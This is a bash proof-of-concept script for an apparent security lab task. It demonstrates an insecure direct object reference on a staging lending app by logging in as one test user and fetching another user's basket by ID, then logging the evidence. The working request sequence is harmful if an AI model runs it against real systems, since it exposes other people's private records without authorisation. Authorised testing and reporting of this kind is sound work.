#!/usr/bin/env bash
# IDOR Proof-of-Concept (Task 4)
#
# Demonstrates that User A, once logged in, can view User B's basket
# (standing in for a "borrower record") just by changing the numeric ID
# in the URL — with no server-side check that the basket actually
# belongs to the requesting user.
set -e

BASE="https://staging.lendwise.test"
RESULTS_DIR="$(dirname "$0")/../docs"
mkdir -p "$RESULTS_DIR"

TS=$(date +%s)
EMAIL_A="poc-user-a-$TS@lendwise.test"
EMAIL_B="poc-user-b-$TS@lendwise.test"
PASSWORD="TestPass123!"

echo "=================================================="
echo " IDOR Proof-of-Concept — LendWise Lab"
echo "=================================================="

echo
echo "--- Step 1: Register User A ($EMAIL_A) ---"
curl -sk -X POST "$BASE/api/Users" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL_A\",\"password\":\"$PASSWORD\",\"passwordRepeat\":\"$PASSWORD\",\"securityQuestion\":{\"id\":1},\"securityAnswer\":\"test\"}" \
  -o /dev/null

echo "--- Step 2: Register User B ($EMAIL_B) ---"
curl -sk -X POST "$BASE/api/Users" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL_B\",\"password\":\"$PASSWORD\",\"passwordRepeat\":\"$PASSWORD\",\"securityQuestion\":{\"id\":1},\"securityAnswer\":\"test\"}" \
  -o /dev/null

echo
echo "--- Step 3: Log in as User A, capture token + basket ID ---"
LOGIN_A=$(curl -sk -X POST "$BASE/rest/user/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL_A\",\"password\":\"$PASSWORD\"}")
TOKEN_A=$(echo "$LOGIN_A" | grep -oE '"token":"[^"]+"' | cut -d'"' -f4)
BASKET_A=$(echo "$LOGIN_A" | grep -oE '"bid":[0-9]+' | grep -oE '[0-9]+')
echo "  User A token acquired. User A's own basket ID: $BASKET_A"

echo
echo "--- Step 4: Log in as User B, capture token + basket ID ---"
LOGIN_B=$(curl -sk -X POST "$BASE/rest/user/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL_B\",\"password\":\"$PASSWORD\"}")
TOKEN_B=$(echo "$LOGIN_B" | grep -oE '"token":"[^"]+"' | cut -d'"' -f4)
BASKET_B=$(echo "$LOGIN_B" | grep -oE '"bid":[0-9]+' | grep -oE '[0-9]+')
echo "  User B token acquired. User B's own basket ID: $BASKET_B"

echo
echo "--- Step 5: THE EXPLOIT — use User A's token to request User B's basket ---"
echo "  Request: GET $BASE/rest/basket/$BASKET_B  (with User A's Authorization token)"
echo
EXPLOIT_RESPONSE=$(curl -sk -w "\nHTTP_STATUS:%{http_code}" "$BASE/rest/basket/$BASKET_B" \
  -H "Authorization: Bearer $TOKEN_A")
STATUS=$(echo "$EXPLOIT_RESPONSE" | grep -oE "HTTP_STATUS:[0-9]+" | cut -d: -f2)
BODY=$(echo "$EXPLOIT_RESPONSE" | sed '/HTTP_STATUS:/d')

echo "Response status: $STATUS"
echo "Response body (truncated):"
echo "$BODY" | head -c 500
echo
echo

if [ "$STATUS" == "200" ]; then
  echo "🔴 VULNERABLE: User A successfully accessed User B's basket (HTTP 200)."
  echo "   This confirms an IDOR — authentication was checked, but authorization"
  echo "   (does this basket belong to the requester?) was not."
else
  echo "✅ NOT VULNERABLE: access was denied (HTTP $STATUS)."
fi

# Save evidence for the report
{
  echo "=== IDOR PoC run at $(date -u +%Y-%m-%dT%H:%M:%SZ) ==="
  echo "User A: $EMAIL_A (basket $BASKET_A)"
  echo "User B: $EMAIL_B (basket $BASKET_B)"
  echo "Exploit request: GET /rest/basket/$BASKET_B using User A's token"
  echo "Response status: $STATUS"
  echo "Response body: $BODY"
  echo
} >> "$RESULTS_DIR/idor-poc-evidence.log"

echo "Evidence appended to docs/idor-poc-evidence.log"
